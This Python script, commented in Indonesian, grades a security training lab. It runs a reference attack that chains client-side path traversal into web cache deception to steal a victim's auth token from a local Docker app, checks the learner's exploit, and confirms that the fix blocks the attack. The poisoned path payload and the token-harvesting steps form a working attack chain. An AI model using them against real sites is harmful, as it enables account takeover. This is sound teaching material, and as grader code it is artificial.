#!/usr/bin/env python3
"""Verifier otomatis 2 fase untuk Lab 12.

Rantai: CSPT -> web cache deception -> account takeover, ala zere.es
"Cache Deception + CSPT: Turning Non Impactful Findings into Account Takeover"
(2025).

Dua temuan yang masing-masing tidak eksploitable:
  1. Cache deception: GET /v1/token.css mengembalikan token korban sebagai
     JSON dengan `Cache-Control: public`, dan nginx meng-cache path berakhiran
     .css dengan cache key yang TIDAK mencakup header auth. Tapi endpoint-nya
     butuh X-Auth-Token, jadi request langsung tanpa auth -> 401.
  2. CSPT: /profile?id=X memuat profile.js yang menggabungkan `id` dari query
     string ke URL fetch tanpa validasi:
         fetch("/v1/users/info/" + userId, {headers: {"X-Auth-Token": ...}})

Digabung: korban mengunjungi ?id=../../../v1/token.css -> browser membangun
/v1/users/info/../../../v1/token.css -> dinormalisasi menjadi GET /v1/token.css
dengan X-Auth-Token korban -> nginx MISS -> teruskan ke app -> respons token
di-cache publik -> penyerang GET /v1/token.css TANPA auth -> HIT -> token
korban bocor -> ATO.

"Browser korban" disimulasikan Python secara setia (victim_visit): login,
kunjungi link beracun *melewati cache*, tiru penggabungan URL ala profile.js +
normalisasi dot-segment ala browser, kirim dengan token korban; lalu peran
bertukar menjadi penyerang tanpa auth.

Hanya memakai Python stdlib (tanpa dependency), butuh `docker compose`
di host.

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - baseline GET / -> 200
      - POST /login (victim/victim123) -> 200 + token
      - GET /profile?id=user123 -> 200
      - GET /v1/users/info/user123 (+token) -> 200, X-Cache-Status BYPASS
      - GET /v1/token.css (TANPA token) -> 401 (tak eksploitable sendirian)
      - serangan referensi (health) -> korban MISS, penyerang HIT,
        STOLEN_TOKEN == token korban
      - exploit/exploit.py milik learner dijalankan -> mencetak
        VICTIM_ID: ..., STATUS: 200, STOLEN_TOKEN: ...;
        verifier memeriksa token bocor via cache secara independen
  FASE 2 (dengan fix/): bangun ulang app dari fix/app, pastikan
      - GET /profile?id=<racun> -> 400 (gerbang fix)
      - simulasi kunjungan korban -> penyerang dapat 401, token TIDAK bocor
      - fungsi normal utuh -> login, /profile?id=user123, info

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/app/app.py identik byte-per-byte dengan app/app.py -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import filecmp
import json
import os
import re
import shutil
import subprocess
import sys
import time
from http.client import HTTPConnection
from urllib.parse import quote

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
VICTIM_TOKEN = "sk-live-7f3a9c2e4b1d8f6a"
VALID_ID = "user123"
POISON_ID = "../../../v1/token.css"
PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " -- " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


def req(method, path, body=None, headers=None):
    c = HTTPConnection(HOST, PORT, timeout=10)
    try:
        c.request(method, path, body=body, headers=headers or {})
        r = c.getresponse()
        h = {}
        for k, v in r.getheaders():
            h[k.lower()] = v
        return r.status, r.read(), h
    finally:
        c.close()


def login():
    st, body, _ = req("POST", "/login",
                      body=json.dumps({"username": "victim",
                                       "password": "victim123"}),
                      headers={"Content-Type": "application/json"})
    try:
        token = json.loads(body.decode()).get("token")
    except Exception:
        token = None
    return st, token


def normalize_path(path):
    """Normalisasi dot-segment ala browser (WHATWG URL)."""
    segs = []
    for seg in path.split("/"):
        if seg in ("", "."):
            continue
        if seg == "..":
            if segs:
                segs.pop()
            continue
        segs.append(seg)
    return "/" + "/".join(segs)


def browser_fetch_url(uid):
    """Replika setia profile.js + browser: gabung tanpa validasi,
    lalu normalisasi dot-segment."""
    return normalize_path("/v1/users/info/" + uid)


def victim_visit(uid):
    """Simulasi kunjungan korban ke link beracun, lalu peran bertukar menjadi
    penyerang tanpa auth yang membaca URL yang sama dari cache.
    -> (status_penyerang, token_curian, cache_status_penyerang)."""
    st, token = login()
    if st != 200 or not token:
        return None, None, None
    st, _, _ = req("GET", "/profile?id=" + quote(uid, safe=""))
    if st != 200:
        return st, None, None
    target = browser_fetch_url(uid)
    st_v, _, h_v = req("GET", target,
                       headers={"X-Auth-Token": token})
    st_a, body_a, h_a = req("GET", "/v1/token.css")
    stolen = None
    if st_a == 200:
        try:
            stolen = json.loads(body_a.decode()).get("token")
        except Exception:
            stolen = None
    return st_a, stolen, h_a.get("x-cache-status")


def reference_attack():
    """Serangan referensi (health check)."""
    return victim_visit(POISON_ID)


def wait_up(timeout=180):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            st, body, _ = req("GET", "/")
            if st == 200 and b"Profile demo" in body:
                return True
        except OSError:
            pass
        time.sleep(2)
    return False


def compose_down():
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])


def parse_exploit_output(out):
    m_id = re.search(r"^VICTIM_ID:\s*(\S+)\s*$", out, re.MULTILINE)
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_tok = re.search(r"^STOLEN_TOKEN:\s*(\S+)\s*$", out, re.MULTILINE)
    return ((m_id.group(1) if m_id else None),
            (m_status.group(1) if m_status else None),
            (m_tok.group(1) if m_tok else None))


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    log("== bersih-bersih container lama ==")
    compose_down()

    # ---------------- FASE 1 ----------------
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, body, _ = req("GET", "/")
    check("baseline GET / -> 200", st == 200 and b"Profile demo" in body,
          "dapat %s" % st)

    st, token = login()
    check("fungsi normal: POST /login -> 200 + token", st == 200 and token,
          "dapat %s" % st)

    st, _, _ = req("GET", "/profile?id=" + VALID_ID)
    check("fungsi normal: GET /profile?id=user123 -> 200", st == 200,
          "dapat %s" % st)

    st, body, h = req("GET", "/v1/users/info/" + VALID_ID,
                      headers={"X-Auth-Token": token or ""})
    ok = st == 200 and b"Victim User" in body
    check("fungsi normal: GET /v1/users/info/user123 -> 200",
          ok, "dapat %s" % st)
    check("cache: info tidak di-cache (BYPASS)", h.get("x-cache-status") == "BYPASS",
          "dapat %r" % h.get("x-cache-status"))

    st, _, _ = req("GET", "/v1/token.css")
    check("diferensial: GET /v1/token.css TANPA auth -> 401 "
          "(tak eksploitable sendirian)", st == 401, "dapat %s" % st)

    log("== [HEALTH] serangan referensi: CSPT -> cache deception -> ATO ==")
    st_a, stolen, cstat = reference_attack()
    check("serangan referensi: penyerang HIT cache -> 200 + token korban",
          st_a == 200 and stolen == VICTIM_TOKEN,
          "dapat status=%s token_cocok=%s" % (st_a, stolen == VICTIM_TOKEN))
    check("serangan referensi: X-Cache-Status penyerang = HIT", cstat == "HIT",
          "dapat %r" % cstat)
    if not (st_a == 200 and stolen == VICTIM_TOKEN):
        log("LAB RUSAK: serangan referensi gagal di definisi pristine.")
        compose_down()
        sys.exit(1)

    log("== FASE 1: reset ke pristine segar untuk exploit learner ==")
    compose_down()
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    log("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    exp = os.path.join(LAB_DIR, "exploit", "exploit.py")
    try:
        p = subprocess.run([sys.executable, exp], capture_output=True,
                           text=True, timeout=60, cwd=os.path.dirname(exp))
    except subprocess.TimeoutExpired:
        log("exploit.py melebihi 60 detik.")
        compose_down()
        sys.exit(1)
    if "NotImplementedError" in (p.stderr or ""):
        log("exploit.py masih scaffold (NotImplementedError). Kerjakan fase 1 dulu.")
        compose_down()
        sys.exit(3)
    vid, status, stok = parse_exploit_output(p.stdout or "")
    check("exploit mencetak VICTIM_ID", bool(vid), "dapat %r" % vid)
    check("exploit mencetak STATUS: 200", status == "200", "dapat %r" % status)
    check("exploit mencetak STOLEN_TOKEN", bool(stok), "dapat %r" % (stok[:12] + "..." if stok else stok))
    st_a, body_a, _ = req("GET", "/v1/token.css")
    try:
        indep = json.loads(body_a.decode()).get("token") if st_a == 200 else None
    except Exception:
        indep = None
    check("verifier independen: token di cache == token korban",
          indep == VICTIM_TOKEN, "dapat cocok=%s" % (indep == VICTIM_TOKEN))
    check("verifier independen: STOLEN_TOKEN == token korban",
          stok == VICTIM_TOKEN, "dapat cocok=%s" % (stok == VICTIM_TOKEN))

    compose_down()

    # ---------------- FASE 2 ----------------
    log("== FASE 2: cek scaffold fix ==")
    pristine = os.path.join(LAB_DIR, "app", "app.py")
    fixed = os.path.join(LAB_DIR, "fix", "app", "app.py")
    if filecmp.cmp(pristine, fixed, shallow=False):
        log("fix/app/app.py masih identik dengan pristine. Kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, _, _ = req("GET", "/profile?id=" + quote(POISON_ID, safe=""))
    check("serangan referensi GAGAL: GET /profile?id=<racun> -> 400",
          st == 400, "dapat %s" % st)

    st_a, stolen, _ = victim_visit(POISON_ID)
    check("serangan referensi GAGAL: token TIDAK bocor via cache",
          not stolen,
          "dapat status=%s stolen=%s" % (st_a, bool(stolen)))

    st, _, _ = req("GET", "/profile?id=" + VALID_ID)
    check("fungsi normal: GET /profile?id=user123 -> 200", st == 200,
          "dapat %s" % st)
    _, token2 = login()
    st, body, _ = req("GET", "/v1/users/info/" + VALID_ID,
                      headers={"X-Auth-Token": token2 or ""})
    check("fungsi normal: GET /v1/users/info/user123 -> 200",
          st == 200 and b"Victim User" in body, "dapat %s" % st)

    compose_down()

    failed = [n for (n, ok) in results if not ok]
    log("== HASIL: %d/%d cek lulus ==" % (len(results) - len(failed), len(results)))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
